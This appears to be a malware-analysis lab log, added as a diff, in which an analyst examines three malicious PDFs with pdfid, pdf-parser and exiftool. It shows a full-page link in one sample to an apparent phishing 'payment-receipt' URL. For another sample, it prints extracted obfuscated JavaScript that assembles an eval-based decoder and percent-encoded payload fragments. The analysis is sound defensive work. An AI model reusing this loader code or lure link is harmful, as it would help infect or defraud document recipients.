@@ -1,0 +1,870 @@
+==========================================================
+initial-identitfication
+==========================================================
+
+(venv) remnux@remnux:~/pdf-lab/samples$ file $S1
+sample1.pdf.malware: PDF document, version 1.3, 1 page(s)
+(venv) remnux@remnux:~/pdf-lab/samples$ sha256sum $S1
+245f16270bf0dfece1ac13f06e2554d059f82b6bc53b1f19b0d835f409b5d80f  sample1.pdf.malware
+(venv) remnux@remnux:~/pdf-lab/samples$ md5sum $S1
+5754058e75aa7cc6377c87000e20bb97  sample1.pdf.malware
+(venv) remnux@remnux:~/pdf-lab/samples$ ls -l $S1
+-rw-r--r-- 1 remnux remnux 182397 Oct  6 09:44 sample1.pdf.malware
+(venv) remnux@remnux:~/pdf-lab/samples$ exiftool $S1
+ExifTool Version Number         : 13.50
+File Name                       : sample1.pdf.malware
+Directory                       : .
+File Size                       : 182 kB
+File Modification Date/Time     : 2026:10:06 09:44:44+00:00
+File Access Date/Time           : 2026:10:06 23:39:24+00:00
+File Inode Change Date/Time     : 2026:10:06 23:39:05+00:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.3
+Linearized                      : No
+Page Count                      : 1
+Page Layout                     : OneColumn
+Producer                        : jsPDF 2.5.1
+Create Date                     : 2026:09:30 05:05:28-07:00
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdfid.py -e $S1
+PDFiD 0.2.10 sample1.pdf.malware
+ PDF Header: %PDF-1.3
+ obj                   23
+ endobj                23
+ stream                 2
+ endstream              2
+ xref                   1
+ trailer                1
+ startxref              1
+ /Page                  1
+ /Encrypt               0
+ /ObjStm                0
+ /JS                    0
+ /JavaScript            0
+ /AA                    0
+ /OpenAction            1
+ /AcroForm              0
+ /JBIG2Decode           0
+ /RichMedia             0
+ /Launch                0
+ /EmbeddedFile          0
+ /XFA                   0
+ /Colors > 2^24         0
+ %%EOF                  1
+ After last %%EOF       0
+ D:20260930050528-07'00  /CreationDate
+ Total entropy:           7.637145 (    182397 bytes)
+ Entropy inside streams:  7.623799 (    178794 bytes)
+ Entropy outside streams: 5.165512 (      3603 bytes)
+
+(venv) remnux@remnux:~/pdf-lab/samples$ file $S2
+sample2.pdf.malware: PDF document, version 1.3
+(venv) remnux@remnux:~/pdf-lab/samples$ sha256sum $S2
+3050d75d5dc63d1242722f52b9f538376e3ee04844f624d33d2a072549864589  sample2.pdf.malware
+(venv) remnux@remnux:~/pdf-lab/samples$ md5sum $S2
+5cd49e845fc143ecb398d161bab3da5a  sample2.pdf.malware
+(venv) remnux@remnux:~/pdf-lab/samples$ ls -l $S2
+-rw-r--r-- 1 remnux remnux 25284561 Oct  6 23:36 sample2.pdf.malware
+(venv) remnux@remnux:~/pdf-lab/samples$ exiftool $S2
+ExifTool Version Number         : 13.50
+File Name                       : sample2.pdf.malware
+Directory                       : .
+File Size                       : 25 MB
+File Modification Date/Time     : 2026:10:06 23:36:08+00:00
+File Access Date/Time           : 2026:10:06 23:45:01+00:00
+File Inode Change Date/Time     : 2026:10:06 23:41:50+00:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+Linearized                      : No
+Media Box                       : 0, 0, 1920, 1080
+Page Count                      : 32
+PDF Version                     : 1.4
+Tagged PDF                      : Yes
+Title                           : The_Ten_Plagues_A_War_Against_The_Gods_Rabbi Nissim Elnecave
+Producer                        : macOS Version 12.3 (Build 21E230) Quartz PDFContext
+Creator                         : Keynote
+Create Date                     : 2025:04:02 01:19:27Z
+Modify Date                     : 2025:04:02 01:19:27Z
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdfid.py -e $S2
+PDFiD 0.2.10 sample2.pdf.malware
+ PDF Header: %PDF-1.3
+ obj                  856
+ endobj               856
+ stream               102
+ endstream            102
+ xref                   1
+ trailer                1
+ startxref              1
+ /Page                 32
+ /Encrypt               0
+ /ObjStm                0
+ /JS                    1
+ /JavaScript            0
+ /AA                    2
+ /OpenAction            0
+ /AcroForm              0
+ /JBIG2Decode           0
+ /RichMedia             0
+ /Launch                0
+ /EmbeddedFile          0
+ /XFA                   0
+ /Colors > 2^24         0
+ %%EOF                  1
+ After last %%EOF       0
+ D:20250402011927Z00'00  /CreationDate
+ D:20250402011927Z00'00  /ModDate
+ Total entropy:           7.998964 (  25284561 bytes)
+ Entropy inside streams:  7.999182 (  25181653 bytes)
+ Entropy outside streams: 4.796126 (    102908 bytes)
+
+(venv) remnux@remnux:~/pdf-lab/samples$ file $S4
+sample4.pdf.malware: PDF document, version 1.4, 0 page(s)
+(venv) remnux@remnux:~/pdf-lab/samples$ sha256sum $S4
+4dc9b0c20ea61d91d6a1b5bdce76fb5365de0762efb8f6c2925113c6a8950cae  sample4.pdf.malware
+(venv) remnux@remnux:~/pdf-lab/samples$ md5sum $S4
+930fc7badacf1a19816a97775662ae54  sample4.pdf.malware
+(venv) remnux@remnux:~/pdf-lab/samples$ ls -l $S4
+-rw-r--r-- 1 remnux remnux 216375 Oct  6 23:51 sample4.pdf.malware
+(venv) remnux@remnux:~/pdf-lab/samples$ exiftool $S4
+ExifTool Version Number         : 13.50
+File Name                       : sample4.pdf.malware
+Directory                       : .
+File Size                       : 216 kB
+File Modification Date/Time     : 2026:10:06 23:51:12+00:00
+File Access Date/Time           : 2026:10:06 23:52:36+00:00
+File Inode Change Date/Time     : 2026:10:06 23:52:06+00:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Trapped                         : False
+Author                          : 
+Title                           : 
+Page Layout                     : SinglePage
+Has XFA                         : No
+Page Count                      : 1
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdfid.py -e $S4
+PDFiD 0.2.10 sample4.pdf.malware
+ PDF Header: %PDF-1.4
+ obj                   20
+ endobj                20
+ stream                 6
+ endstream              6
+ xref                   1
+ trailer                1
+ startxref              1
+ /Page                  1
+ /Encrypt               0
+ /ObjStm                0
+ /JS                    2
+ /JavaScript            3
+ /AA                    0
+ /OpenAction            1
+ /AcroForm              1
+ /JBIG2Decode           0
+ /RichMedia             0
+ /Launch                0
+ /EmbeddedFile          0
+ /XFA                   0
+ /Colors > 2^24         0
+ %%EOF                  1
+ After last %%EOF       0
+ Total entropy:           7.978595 (    216375 bytes)
+ Entropy inside streams:  7.979552 (    214105 bytes)
+ Entropy outside streams: 5.059198 (      2270 bytes)
+
+
+
+
+
+======================================================
+s1
+======================================================
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -a $S1
+Comment: 3
+XREF: 1
+Trailer: 1
+StartXref: 1
+Indirect object: 23
+Indirect objects with a stream: 4, 21
+  5: 4, 19, 20, 2, 22
+ /Catalog 1: 23
+ /Font 14: 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18
+ /Page 1: 3
+ /Pages 1: 1
+ /XObject 1: 21
+Search keywords:
+ /OpenAction 1: 23
+ /URI 1: 3
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 23 $S1
+obj 23 0
+ Type: /Catalog
+ Referencing: 1 0 R, 3 0 R
+
+  <<
+    /Type /Catalog
+    /Pages 1 0 R
+    /OpenAction [3 0 R /FitH null]
+    /PageLayout /OneColumn
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 3 $S1
+obj 3 0
+ Type: /Page
+ Referencing: 1 0 R, 2 0 R, 4 0 R
+
+  <<
+    /Type /Page
+    /Parent 1 0 R
+    /Resources 2 0 R
+    /MediaBox [0 0 595.2799999999999727 841.8899999999999864]
+    /Annots
+      <<
+        /Type /Annot
+        /Subtype /Link
+        /Rect [0. 841.8899999999999864 595.2799999999999727 0.0145410628019818]
+        /Border [0 0 0]
+        /A
+          <<
+            /S /URI
+            /URI (https://update-two-tau.vercel.app/payment-receipt)
+          >>
+      >>
+    ] /Contents 4 0 R
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ qpdf --check $S1
+checking sample1.pdf.malware
+PDF Version: 1.3
+File is not encrypted
+File is not linearized
+No syntax or stream encoding errors found; the file may still contain
+errors that qpdf cannot detect
+
+
+
+=======================================================
+s2
+=======================================================
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -a $S2
+Comment: 3
+XREF: 1
+Trailer: 1
+StartXref: 1
+Indirect object: 856
+Indirect objects with a stream: 3, 6, 14, 15, 16, 18, 20, 26, 28, 30, 31, 32, 33, 35, 37, 40, 41, 44, 46, 47, 50, 52, 53, 56, 58, 59, 60, 63, 65, 66, 67, 71, 73, 77, 79, 81, 86, 88, 92, 94, 96, 100, 102, 104, 108, 110, 112, 116, 118, 120, 124, 126, 128, 132, 134, 137, 139, 143, 145, 147, 151, 153, 155, 159, 161, 165, 167, 169, 173, 175, 177, 181, 183, 185, 187, 191, 193, 195, 199, 202, 204, 208, 210, 214, 216, 220, 222, 226, 228, 230, 234, 236, 240, 242, 246, 248, 845, 847, 849, 850, 852, 856
+  139: 3, 4, 7, 15, 5, 16, 13, 18, 19, 26, 25, 28, 29, 37, 38, 44, 45, 50, 51, 56, 57, 63, 64, 71, 72, 74, 79, 80, 82, 86, 87, 89, 94, 95, 97, 102, 103, 105, 110, 111, 113, 118, 119, 121, 126, 127, 129, 134, 133, 137, 138, 140, 145, 146, 148, 153, 154, 156, 159, 160, 162, 167, 168, 170, 175, 176, 178, 183, 182, 185, 186, 188, 193, 194, 196, 202, 203, 205, 208, 209, 211, 214, 215, 217, 220, 221, 223, 228, 229, 231, 234, 235, 237, 240, 241, 243, 246, 247, 249, 218, 232, 179, 238, 206, 42, 114, 10, 48, 83, 171, 212, 224, 68, 75, 34, 250, 130, 157, 54, 61, 106, 98, 24, 141, 122, 189, 197, 244, 149, 90, 163, 845, 847, 849, 850, 852, 854, 856, 857
+ /Catalog 1: 843
+ /ExtGState 18: 11, 12, 76, 84, 91, 99, 107, 115, 123, 131, 142, 150, 164, 172, 180, 190, 198, 225
+ /Font 6: 8, 9, 22, 23, 39, 853
+ /FontDescriptor 5: 844, 846, 848, 851, 855
+ /Page 32: 1, 17, 27, 36, 43, 49, 55, 62, 69, 78, 85, 93, 101, 109, 117, 125, 135, 144, 152, 158, 166, 174, 184, 192, 200, 207, 213, 219, 227, 233, 239, 245
+ /Pages 5: 2, 70, 136, 201, 842
+ /StructElem 590: 251, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 574, 576, 577, 575, 578, 579, 273, 274, 275, 276, 277, 278, 279, 280, 281, 580, 583, 584, 581, 585, 586, 582, 587, 588, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 589, 591, 592, 590, 593, 594, 301, 302, 303, 304, 305, 306, 307, 308, 309, 595, 597, 598, 596, 599, 600, 310, 311, 312, 313, 314, 315, 316, 317, 318, 601, 604, 602, 605, 606, 603, 607, 608, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 609, 610, 611, 329, 330, 331, 332, 612, 613, 614, 333, 334, 335, 336, 337, 338, 339, 615, 617, 618, 616, 619, 620, 340, 341, 342, 343, 344, 345, 346, 347, 621, 624, 622, 625, 626, 623, 627, 628, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 629, 632, 633, 630, 634, 635, 631, 636, 637, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 638, 639, 640, 379, 380, 641, 643, 644, 642, 645, 646, 381, 382, 383, 384, 385, 386, 647, 648, 649, 387, 388, 389, 390, 391, 392, 393, 394, 650, 651, 652, 395, 396, 397, 398, 399, 400, 401, 402, 653, 655, 656, 654, 657, 658, 403, 404, 405, 406, 407, 408, 409, 410, 659, 662, 663, 660, 664, 665, 661, 666, 667, 411, 412, 413, 414, 415, 416, 417, 418, 668, 670, 671, 669, 672, 673, 419, 420, 421, 422, 423, 424, 425, 426, 674, 677, 678, 675, 679, 680, 676, 681, 682, 427, 428, 429, 430, 431, 432, 433, 434, 683, 686, 687, 684, 688, 689, 685, 690, 691, 435, 436, 437, 438, 439, 440, 441, 442, 692, 695, 696, 693, 697, 698, 694, 699, 700, 443, 444, 445, 446, 447, 448, 449, 450, 701, 705, 706, 702, 707, 708, 703, 709, 710, 704, 711, 712, 451, 452, 453, 454, 455, 456, 457, 458, 713, 716, 717, 714, 718, 719, 715, 720, 721, 459, 460, 461, 462, 463, 464, 465, 466, 722, 725, 726, 723, 727, 728, 724, 729, 730, 467, 468, 469, 470, 471, 472, 473, 474, 731, 734, 735, 732, 736, 737, 733, 738, 739, 475, 476, 477, 478, 479, 480, 481, 482, 740, 743, 744, 741, 745, 746, 742, 747, 748, 483, 484, 485, 486, 487, 488, 489, 490, 749, 751, 750, 752, 753, 491, 492, 493, 494, 495, 496, 497, 754, 756, 755, 757, 758, 498, 499, 500, 501, 502, 503, 504, 505, 759, 761, 760, 762, 763, 506, 507, 508, 509, 510, 511, 512, 513, 764, 766, 765, 767, 768, 514, 515, 516, 517, 518, 519, 520, 521, 522, 769, 775, 770, 776, 777, 771, 778, 779, 772, 780, 781, 773, 782, 783, 774, 784, 785, 523, 524, 525, 526, 527, 528, 529, 530, 531, 786, 792, 787, 793, 794, 788, 795, 796, 789, 797, 798, 790, 799, 800, 791, 801, 802, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 803, 809, 804, 810, 811, 805, 812, 813, 806, 814, 815, 807, 816, 817, 808, 818, 819, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 820, 826, 821, 827, 828, 822, 829, 830, 823, 831, 832, 824, 833, 834, 825, 835, 836, 552, 553, 554, 555, 556, 557, 558, 559, 837, 838, 560, 839, 840, 841, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573
+ /StructTreeRoot 1: 252
+ /XObject 59: 6, 14, 20, 30, 31, 32, 33, 35, 40, 41, 46, 47, 52, 53, 58, 59, 60, 65, 66, 67, 73, 77, 81, 88, 92, 96, 100, 104, 108, 112, 116, 120, 124, 128, 132, 139, 143, 147, 151, 155, 161, 165, 169, 173, 177, 181, 187, 191, 195, 199, 204, 210, 216, 222, 226, 230, 236, 242, 248
+Unreferenced indirect objects: 10 0 R, 24 0 R, 34 0 R, 42 0 R, 48 0 R, 54 0 R, 61 0 R, 68 0 R, 75 0 R, 83 0 R, 90 0 R, 98 0 R, 106 0 R, 114 0 R, 122 0 R, 130 0 R, 141 0 R, 149 0 R, 157 0 R, 163 0 R, 171 0 R, 179 0 R, 189 0 R, 197 0 R, 206 0 R, 212 0 R, 218 0 R, 224 0 R, 232 0 R, 238 0 R, 244 0 R, 250 0 R
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py --search /JS $S2
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py --search /AA $S2
+obj 8 0
+ Type: /Font
+ Referencing: 844 0 R
+
+  <<
+    /Type /Font
+    /Subtype /TrueType
+    /BaseFont /AAAAAB+DINCondensed-Bold
+    /FontDescriptor 844 0 R
+    /Encoding /MacRomanEncoding
+    /FirstChar 32
+    /LastChar 213
+    /Widths '[\n186 0 0 372 0 0 0 0 222 222 0 0 186 389 186 0 372 372 372 372 372 372 372\n372 372 372 186 0 0 0 0 0 0 407 426 407 426 370 370 426 426 204 333 426 370\n556 444 426 407 0 426 406 332 426 407 593 389 388 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n186 ]'
+  >>
+
+
+obj 844 0
+ Type: /FontDescriptor
+ Referencing: 845 0 R
+
+  <<
+    /Type /FontDescriptor
+    /FontName /AAAAAB+DINCondensed-Bold
+    /Flags 32
+    /FontBBox [-716 -312 1000 1023]
+    /ItalicAngle 0
+    /Ascent 712
+    /Descent -288
+    /CapHeight 712
+    /StemV 102
+    /Leading 200
+    /XHeight 507
+    /StemH 96
+    /AvgWidth 374
+    /MaxWidth 1000
+    /FontFile2 845 0 R
+  >>
+
+
+obj 9 0
+ Type: /Font
+ Referencing: 846 0 R
+
+  <<
+    /Type /Font
+    /Subtype /TrueType
+    /BaseFont /AAAAAC+DINAlternate-Bold
+    /FontDescriptor 846 0 R
+    /Encoding /MacRomanEncoding
+    /FirstChar 32
+    /LastChar 213
+    /Widths '[\n240 0 0 0 0 0 0 0 278 278 0 0 240 407 0 0 480 480 480 0 0 480 0 0 0 0 0 0\n0 0 0 0 0 610 610 556 630 556 537 610 648 258 481 630 556 758 684 610 593\n0 610 574 500 630 556 832 0 500 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 240 ]'
+  >>
+
+
+obj 846 0
+ Type: /FontDescriptor
+ Referencing: 847 0 R
+
+  <<
+    /Type /FontDescriptor
+    /FontName /AAAAAC+DINAlternate-Bold
+    /Flags 32
+    /FontBBox [-515 -274 1255 1113]
+    /ItalicAngle 0
+    /Ascent 938
+    /Descent -226
+    /CapHeight 718
+    /StemV 108
+    /XHeight 718
+    /StemH 102
+    /AvgWidth 481
+    /MaxWidth 1330
+    /FontFile2 847 0 R
+  >>
+
+
+obj 22 0
+ Type: /Font
+ Referencing: 848 0 R, 849 0 R
+
+  <<
+    /Type /Font
+    /Subtype /TrueType
+    /BaseFont /AAAAAE+LucidaGrande
+    /FontDescriptor 848 0 R
+    /ToUnicode 849 0 R
+    /FirstChar 33
+    /LastChar 33
+    /Widths [ 530 ]
+  >>
+
+
+obj 848 0
+ Type: /FontDescriptor
+ Referencing: 850 0 R
+
+  <<
+    /Type /FontDescriptor
+    /FontName /AAAAAE+LucidaGrande
+    /Flags 4
+    /FontBBox [-1067 -737 1641 1162]
+    /ItalicAngle 0
+    /Ascent 967
+    /Descent -211
+    /CapHeight 723
+    /StemV 103
+    /XHeight 530
+    /StemH 77
+    /AvgWidth -490
+    /MaxWidth 1640
+    /FontFile2 850 0 R
+  >>
+
+
+obj 23 0
+ Type: /Font
+ Referencing: 851 0 R
+
+  <<
+    /Type /Font
+    /Subtype /TrueType
+    /BaseFont /AAAAAF+AvenirNext-Medium
+    /FontDescriptor 851 0 R
+    /Encoding /MacRomanEncoding
+    /FirstChar 32
+    /LastChar 223
+    /Widths '[\n250 0 0 574 0 0 723 0 315 315 0 0 260 320 260 0 595 595 595 595 595 595 595\n595 595 595 300 300 0 0 0 500 0 711 642 708 761 601 568 778 729 271 495 659\n511 903 772 849 595 0 614 569 569 712 0 988 0 0 0 0 0 0 0 0 0 542 636 494\n635 573 310 632 584 259 260 527 260 887 582 610 634 633 362 444 329 582 504\n773 511 504 462 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 426 426 0 246 0 0 0 0 0 0 0 0 574\n574 ]'
+  >>
+
+
+obj 851 0
+ Type: /FontDescriptor
+ Referencing: 852 0 R
+
+  <<
+    /Type /FontDescriptor
+    /FontName /AAAAAF+AvenirNext-Medium
+    /Flags 32
+    /FontBBox [-440 -436 1369 1199]
+    /ItalicAngle 0
+    /Ascent 1000
+    /Descent -366
+    /CapHeight 708
+    /StemV 99
+    /XHeight 474
+    /StemH 88
+    /AvgWidth 459
+    /MaxWidth 1603
+    /FontFile2 852 0 R
+  >>
+
+
+obj 39 0
+ Type: /Font
+ Referencing: 853 0 R
+
+  <<
+    /Type /Font
+    /Subtype /Type0
+    /Encoding /Identity-H
+    /DescendantFonts [853 0 R]
+    /BaseFont /AAAAAG+HiraginoSans-W6
+  >>
+
+
+obj 853 0
+ Type: /Font
+ Referencing: 854 0 R, 855 0 R
+
+  <<
+    /Type /Font
+    /Subtype /CIDFontType0
+    /BaseFont /AAAAAG+HiraginoSans-W6
+    /CIDSystemInfo
+      <<
+        /Registry (Adobe)
+        /Ordering (Japan1)
+        /Supplement 7
+      >>
+    /W 854 0 R
+    /DW 1000
+    /FontDescriptor 855 0 R
+  >>
+
+
+obj 855 0
+ Type: /FontDescriptor
+ Referencing: 856 0 R
+
+  <<
+    /Type /FontDescriptor
+    /FontName /AAAAAG+HiraginoSans-W6
+    /Flags 4
+    /FontBBox [-401 -447 1327 1281]
+    /ItalicAngle 0
+    /Ascent 880
+    /Descent -120
+    /CapHeight 784
+    /StemV 129
+    /Leading 500
+    /XHeight 562
+    /StemH 117
+    /AvgWidth 1000
+    /MaxWidth 1790
+    /FontFile3 856 0 R
+  >>
+
+
+=================================================
+s4
+=================================================
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -a $S4
+Comment: 3
+XREF: 1
+Trailer: 1
+StartXref: 1
+Indirect object: 20
+Indirect objects with a stream: 1, 3, 5, 6, 17, 19
+  14: 2, 4, 5, 6, 11, 10, 8, 9, 15, 16, 17, 18, 19, 20
+ /Catalog 1: 7
+ /Outlines 1: 12
+ /Page 1: 14
+ /Pages 1: 13
+ /XObject 2: 1, 3
+Search keywords:
+ /JS 2: 7, 18
+ /JavaScript 3: 7, 9, 18
+ /OpenAction 1: 7
+ /AcroForm 1: 7
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py --search openaction $S4
+obj 7 0
+ Type: /Catalog
+ Referencing: 8 0 R, 9 0 R, 10 0 R, 11 0 R, 12 0 R, 13 0 R
+
+  <<
+    /OpenAction
+      <<
+        /S /JavaScript
+        /JS '(this.WRYXKTNGCHZUIHQNDKDRYSREUUBHDTLWVGNINGPL\\(\\))'
+      >>
+    /Dests 8 0 R
+    /PageLayout /SinglePage
+    /Names 9 0 R
+    /Type /Catalog
+    /AcroForm 10 0 R
+    /Threads 11 0 R
+    /Outlines 12 0 R
+    /Pages 13 0 R
+    /ViewerPreferences
+      <<
+        /PageDirection /L2R
+      >>
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py --search javascript $S4
+obj 7 0
+ Type: /Catalog
+ Referencing: 8 0 R, 9 0 R, 10 0 R, 11 0 R, 12 0 R, 13 0 R
+
+  <<
+    /OpenAction
+      <<
+        /S /JavaScript
+        /JS '(this.WRYXKTNGCHZUIHQNDKDRYSREUUBHDTLWVGNINGPL\\(\\))'
+      >>
+    /Dests 8 0 R
+    /PageLayout /SinglePage
+    /Names 9 0 R
+    /Type /Catalog
+    /AcroForm 10 0 R
+    /Threads 11 0 R
+    /Outlines 12 0 R
+    /Pages 13 0 R
+    /ViewerPreferences
+      <<
+        /PageDirection /L2R
+      >>
+  >>
+
+
+obj 9 0
+ Type: 
+ Referencing: 16 0 R
+
+  <<
+    /JavaScript 16 0 R
+  >>
+
+
+obj 18 0
+ Type: 
+ Referencing: 19 0 R
+
+  <<
+    /S /JavaScript
+    /JS 19 0 R
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py --search acroform $S4
+obj 7 0
+ Type: /Catalog
+ Referencing: 8 0 R, 9 0 R, 10 0 R, 11 0 R, 12 0 R, 13 0 R
+
+  <<
+    /OpenAction
+      <<
+        /S /JavaScript
+        /JS '(this.WRYXKTNGCHZUIHQNDKDRYSREUUBHDTLWVGNINGPL\\(\\))'
+      >>
+    /Dests 8 0 R
+    /PageLayout /SinglePage
+    /Names 9 0 R
+    /Type /Catalog
+    /AcroForm 10 0 R
+    /Threads 11 0 R
+    /Outlines 12 0 R
+    /Pages 13 0 R
+    /ViewerPreferences
+      <<
+        /PageDirection /L2R
+      >>
+  >>
+  
+(venv) remnux@remnux:~/pdf-lab/samples$ mkdir -p out_s4
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 16 $S4
+obj 16 0
+ Type: 
+ Referencing: 18 0 R
+
+  <<
+    /Names [(WRYXKTNGCHZUIHQNDKDRYSREUUBHDTLWVGNINGPL) 18 0 R]
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 18 $S4
+obj 18 0
+ Type: 
+ Referencing: 19 0 R
+
+  <<
+    /S /JavaScript
+    /JS 19 0 R
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 19 $S4
+obj 19 0
+ Type: 
+ Referencing: 
+ Contains stream
+
+  <<
+    /Filter /FlateDecode
+    /Length 7179
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 19 -f -d out_s $S4
+out_s4/      out_sample1/ 
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 19 -f -d out_s4/js_19.js $S4
+obj 19 0
+ Type: 
+ Referencing: 
+ Contains stream
+
+  <<
+    /Filter /FlateDecode
+    /Length 7179
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ js-beautify out_s4/js_19.js > out_s4/js_19.js 
+(venv) remnux@remnux:~/pdf-lab/samples$ head -c 3000 out_s4/js_19.js 
+(venv) remnux@remnux:~/pdf-lab/samples$ ls -l out_s4/js_19.js 
+-rw-rw-r-- 1 remnux remnux 0 Oct  7 01:00 out_s4/js_19.js
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 19 -f -d out_s4/js_19_obfuscated.js $S4
+obj 19 0
+ Type: 
+ Referencing: 
+ Contains stream
+
+  <<
+    /Filter /FlateDecode
+    /Length 7179
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ ls -l out_s4/js_19_obfuscated.js 
+-rw-rw-r-- 1 remnux remnux 17497 Oct  7 01:01 out_s4/js_19_obfuscated.js
+(venv) remnux@remnux:~/pdf-lab/samples$ js-beautify out_s4/js_19_obfuscated.js > out_s4/js_19.js 
+(venv) remnux@remnux:~/pdf-lab/samples$ head -c 3000 out_s4/js_19.js 
+gkphk = '';
+hyltlzyr = ("kasg", "vfys", "zsjj", "qtkj", "zfch", "tmxf", "eits", "ydcy", "huzl", "xovi", "bhpe", "lktc")[("rirh", "msas", "qxsf", "mkva", "xdax", "goib", "hsie", "lzem", "nkls", "eval")];
+gkphk = '';
+xshgxzgf = ';whi';
+sdgvd = '0,y';
+xrswtvc = ' ws';
+sjoapzt = 'twax';
+mfecyrm = 'ngth>';
+fhkmqp = '=ya';
+zxtsiqh = '.le';
+oojjaqhf = 'le(ya';
+ztghjl = '+=yao';
+krnhojui = 'uhc.';
+jlewfxk = 'odu';
+smljrb = 'gth-';
+ddytxnxk = 'doe';
+oueqbm = 'uhc)';
+fqwyzxgz = '0){yu';
+fceskr = '{yun';
+kmqzsjw = 'aoduh';
+qhrqfw = '1);';
+vcymzsr = 's;};';
+jvdcvb = 'hc.su';
+gohyw = 'oes';
+exfrbokx = '(yaod';
+bhmtsl = 'aod';
+kwnwoex = 'ring(';
+fchzbi = 'funct';
+hsqxcx = 'nkl';
+nagmbm = '}re';
+imxawkuu = 'nkld';
+mdxqji = 'duh';
+chgduhrd = 'duhc';
+mbptj = 'oduhc';
+spzjhwq = 'harAt';
+alxtxqo = 'turn';
+xujipt = 'ap(y';
+cocofnhc = 'es=""';
+mefcuf = 'c.c';
+tddbds = 'bst';
+apebh = 'lengt';
+sxgununp = 'kldo';
+mgeztzln = 'h-1';
+hkcoctuy = ' yu';
+vtfon = ');yao';
+crldyth = 'ion';
+xvuzqi = 'c.len';
+gkphk += fchzbi + crldyth + xrswtvc + sjoapzt + xujipt + bhmtsl + oueqbm + fceskr + sxgununp + cocofnhc + xshgxzgf + oojjaqhf + mbptj + zxtsiqh + mfecyrm + fqwyzxgz + imxawkuu + gohyw + ztghjl + mdxqji + mefcuf + spzjhwq + exfrbokx + krnhojui + apebh + mgeztzln + vtfon + chgduhrd + fhkmqp + jlewfxk + jvdcvb + tddbds + kwnwoex + sdgvd + kmqzsjw + xvuzqi + smljrb + qhrqfw + nagmbm + alxtxqo + hkcoctuy + hsqxcx + ddytxnxk + vcymzsr;
+hyltlzyr(gkphk);
+gkphk = '';
+isqhurtf = wstwaxap(' = ');
+kuhmk = wstwaxap(')HIUA');
+oimcxpls = wstwaxap('u%1ec');
+ievhgf = wstwaxap('b66bu');
+zuftsvx = wstwaxap('%84ad');
+cliydrou = wstwaxap('0d0');
+zvnwb = wstwaxap('7a6u');
+rnunuyh = wstwaxap('36bu');
+qzdhgspj = wstwaxap('c0a');
+jgokenp = wstwaxap('552');
+cpiquaei = wstwaxap(' rav;');
+fznjnky = wstwaxap('u%551');
+zwtegmj = wstwaxap('Ty1WI');
+cijqya = wstwaxap('6b0');
+luenv = wstwaxap(' = m');
+zxylyj = wstwaxap('m,"');
